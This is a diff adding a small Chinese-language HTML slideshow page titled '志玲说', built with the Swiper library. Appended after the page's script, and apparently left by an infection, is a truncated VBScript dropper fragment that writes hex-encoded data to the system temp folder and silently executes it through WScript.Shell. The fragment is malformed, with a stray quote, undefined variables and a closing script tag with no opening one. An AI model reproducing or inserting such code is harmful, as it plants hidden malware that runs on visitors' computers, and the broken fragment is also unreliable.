@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+	<meta charset="UTF-8">
+	<title>志玲说</title>
+	<link rel="stylesheet" href="css/swiper.min.css">
+	<link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+<div class="swiper-container">
+    <div class="swiper-wrapper">
+        <div class="s1 swiper-slide"></div>
+        <div class="s2 swiper-slide"></div>
+        <div class="s3 swiper-slide"></div>
+        <div class="s4 swiper-slide"></div>
+        <div class="s5 swiper-slide"></div>
+        <div class="s6 swiper-slide"></div>
+        <div class="s7 swiper-slide"></div>
+    </div>
+</div>
+
+
+	<script src="js/swiper.min.js"></script>
+	<script>        
+  	var mySwiper = new Swiper ('.swiper-container', {
+    direction: 'vertical',
+    loop: true,
+  	})        
+  </script>
+
+
+"
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
